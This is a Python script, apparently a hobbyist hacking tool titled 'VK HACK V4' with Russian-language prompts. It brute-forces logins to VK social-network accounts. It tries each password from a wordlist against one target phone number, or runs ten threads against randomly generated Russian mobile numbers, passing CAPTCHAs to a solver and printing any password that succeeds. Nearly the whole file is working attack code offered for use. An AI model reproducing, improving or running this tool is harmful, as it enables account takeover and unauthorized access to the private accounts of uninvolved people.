# -*- coding: utf-8 -*-
# vk bruteforce by SiberianHckr
#
# + добавить массовый брут
# + добавить прокси (http, socks4, socks5)

import vk_captchasolver as vc
import vk_api
from threading import Thread
import os
import time
import requests
import random
from colorama import Fore, init

init()
os.system("cls")
os.system("title VK HACK V4")


banner = Fore.BLUE + '''\n\n\n▒█░░▒█ ▒█░▄▀ 　 ▒█░▒█ ░█▀▀█ ▒█▀▀█ ▒█░▄▀ 　 ▒█░░▒█ ░█▀█░ 
░▒█▒█░ ▒█▀▄░ 　 ▒█▀▀█ ▒█▄▄█ ▒█░░░ ▒█▀▄░ 　 ░▒█▒█░ █▄▄█▄ 
░░▀▄▀░ ▒█░▒█ 　 ▒█░▒█ ▒█░▒█ ▒█▄▄█ ▒█░▒█ 　 ░░▀▄▀░ ░░░█░'''

passwords = open("passwords.txt", mode="r").readlines()
print(banner + Fore.GREEN + "\n Введите желаемый режим: \n\t1.Таргетированная атака\n\t2.Рандомизированная атака")

mode = input("Режим (цифра): ")

def download_test(url):
    content = requests.get(url).content
    file = open("file.png", "wb")
    file.write(content)
    file.close()

def CPacketLoginStart(number, password):
    try:
        print("Попытка подключения... " + number + ":" + password)
        vk_session = vk_api.VkApi(number, password)
        vk_session.auth()
        vk = vk_session.get_api()
    except vk_api.Captcha as captcha:
            solved_captcha_code = vc.solve(captcha.sid, s=1)
            print({solved_captcha_code})
    except:
        pass
    else:
        print("Успешный логин! Пароль - " + password)
        exit()

def start_bruteforce(number):
    for passw in passwords:
        pw = passw.strip()
        CPacketLoginStart(number, pw)

def start_randomhack():
    prefixes = ["7923", "7901", "7924", "7962", "7929"]
    #79027539466 (sample)
    while True:
        time.sleep(3)
        for i in range(10):
            for pasw in passwords:
                random_index = random.randint(0, len(prefixes) - 1)
                CPacketLoginStart(prefixes[random_index] + str(random.randrange(1234567, 9999999)), pasw.strip())

if mode == "1":
    phone_number = "+7" + input("Номер: +7")
    start_bruteforce(phone_number)
if mode == "3":
    print("Выбрана массовая атака! Нужные номера для атаки в masshack.txt!")
    #update soon/
if mode == "2":
    print("Выбрана рандомизация атаки... Генерируем номера операторов...")
    for thrs in range(10):
        th = Thread(target=start_randomhack)
        th.start()